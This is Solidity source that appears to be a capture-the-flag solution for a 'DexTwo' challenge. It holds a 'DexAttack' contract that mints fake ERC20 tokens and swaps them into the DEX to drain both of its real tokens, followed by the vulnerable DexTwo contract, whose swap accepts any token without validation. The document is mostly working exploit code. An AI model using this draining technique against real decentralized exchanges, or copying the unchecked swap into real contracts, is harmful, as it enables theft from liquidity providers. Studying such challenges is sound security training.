// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


//import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0-solc-0.8/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

interface IDex { 
    function swap(address from, address to, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function token1() external pure returns(address);
    function token2() external pure returns(address);
    function approve(address spender, uint amount) external;
}

// interface IERC20 {
//     function transferFrom(address sender, address recipent, uint256 amount) external returns (bool);
// }

//Make ERC20 token
//Mint a lot of it
//Send 10 to the dex
//call swap(fakeToken, token1, 10);

contract DexAttack {
    IDex public immutable dex;
    FakeToken fakeToken;
    FakeTokenTwo fakeTokenTwo;
    address public immutable tokenOne;
    address public immutable tokenTwo;
    
    constructor(address _dex) {//0x4Dff5E5cd9fEd75676175363A2ED418d5a0943b6
    dex = IDex(_dex); //0x82a4FE45f0E89E92C4582f2a4eBf49511547547F
    tokenOne = dex.token1(); //0xd9116bdfD56a4F7F99bdf3b977b3CA1ed497022D
    tokenTwo = dex.token2(); //0x414f04C56e48b2eeA22103E1121e6b68Ea769496
    fakeToken = new FakeToken(address(this), "fakeToken", "FT", 10000);
    fakeTokenTwo = new FakeTokenTwo(address(this), "fakeTokenTwo", "FTT", 10000);
    } 
    
    function attack() external {
        fakeToken.approve(address(dex), type(uint256).max);
        fakeToken.transfer(address(dex), 10);
        dex.swap(address(fakeToken), tokenOne, 10);
        
        fakeTokenTwo.approve(address(dex), type(uint256).max);
        fakeTokenTwo.transfer(address(dex), 10);
        dex.swap(address(fakeTokenTwo), tokenTwo, 10);
    }
    
    }

contract FakeToken is ERC20 {
  address private attacker;
  constructor(address _attacker, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        attacker = _attacker;
  }


}

contract FakeTokenTwo is ERC20 {
  address private attacker;
  constructor(address _attacker, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        attacker = _attacker;
  }

}



//====================================


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
